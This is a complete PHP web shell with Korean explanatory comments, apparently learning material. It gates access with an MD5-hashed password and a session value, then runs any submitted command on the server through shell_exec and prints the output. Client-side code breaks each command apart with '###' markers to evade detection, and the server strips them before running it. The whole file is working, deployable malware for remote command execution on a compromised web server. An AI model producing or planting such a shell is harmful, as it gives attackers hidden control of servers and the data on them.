<?php
// cmd 의 결과값은 EUC-KR 형식이므로 웹 페이지의 문자 인코딩을 EUC-KR로 설정
header("Content-Type: text/html; charset=EUC-KR");
// 현재 스크립트의 URL 경로를 $page 변수에 저장
$page = $_SERVER["PHP_SELF"];

//로그인 검증 기능 추가
@session_start(); // 세션 시작
$password = "19fbb8b248a686317a5da1d0619df988"; //crehacktive 패스워드를 MD5 Hash 암호화
$input_password = isset($_POST["password"]) ? $_POST["password"] : ""; // 사용자 입력 비밀번호가 비어있다면 빈 문자열로 지정

// 세션이 없고 입력된 비밀번호가 없을 경우 로그인 폼 표시
if(empty($_SESSION["webshell_id"]) && empty($input_password)) {
    ?>
    <form action="<?=$page?>" method="POST">
        <input type="password" name="password">
        <input type="submit" value="AUTH">
    </form>
    <?php
    exit(); // 스크립트 실행 중단
} else if (empty($_SESSION["webshell_id"]) && !empty($input_password)) {
    // 입력된 비밀번호의 MD5 해시값과 저장된 비밀번호 해시값 비교
    if($password == MD5($input_password)){
        //Login Success => Session 발급
        $_SESSION["webshell_id"] = "crehacktive"; // 세션에 사용자 ID 저장
        echo "<script>location.href='{$page}'</script>"; // 같은 페이지로 리다이렉트
        exit();
    }
    else{
        echo "<script>location.href='{$page}'</script>"; // 로그인 실패 시 같은 페이지로 리다이렉트
    }
}
?>
<script>
    // 엔터 키(keyCode:13) 누르면 명령어 실행하게 해주는 이벤트 리스너야.
    // 이렇게 하면 사용자가 입력 필드에서 엔터 키를 누를 때마다 명령어가 자동으로 실행돼.
    // 편의성을 위해 추가
    document.addEventListener("keydown", (event)=>{if(event.keyCode === 13){cmdRequest()}});

    function cmdRequest() {
        var frm = document.frm; //frm'이라는 이름의 폼을 찾아서 변수에 저장해.
        var cmd = frm.cmd.value; //사용자가 입력한 'name="cmd"'인 입력 필드의 값을 가져온다.
        var enc_cmd = "";

        // 명령어를 문자 단위로 쪼개서 "###"을 사이에 넣어.
        // 이거 서버에서 다시 원래대로 만들 거야.
        for(i=0; i<cmd.length; i++) {
            enc_cmd += cmd.charAt(i) + "###";
        }
        // 인코딩된 명령어를 폼의 cmd 필드에 다시 설정해.
        // 이렇게 하면 서버로 전송될 때 인코딩된 형태로 가게 돼.
        frm.cmd.value = enc_cmd;

        // 폼의 action 속성을 현재 페이지 URL로 설정만 하고, frm.submit()으로 보낸다.
        // 새로운 명령어 실행: 매번 폼을 제출할 때마다 새로운 cmd 값을 서버로 보내. 이전 명령어는 유지되지 않아
        frm.action = "<?=$page?>";
        // 폼을 제출해서 서버로 명령어를 보내.
        frm.submit();
    }
</script>


<form name="frm" method="POST">
    <input type="text" name="cmd">
    <input type="button" onClick="cmdRequest();" value="EXECUTE">
</form>


<?php
if (isset($_POST["cmd"])) { // 'cmd' 키가 $_POST 배열에 존재하는지 확인
    $cmd = $_POST["cmd"];
    if (!empty($cmd)) { //// 'cmd' 값이 존재하는지 확인
        // shell_exec()를 통해 사용자 입력 명령어를 실행
        // "###" 제거하고 원래 명령어로 복원
        $cmd = str_replace("###","",$cmd);
        $result = shell_exec($cmd);
        // 명령어 실행 결과의 개행 문자를 HTML 줄바꿈 태그로 변환
        $result = str_replace("\n", "<br>", $result);
        // 명령어 실행 결과를 웹 페이지에 출력
        echo $result;
    }
}
?>
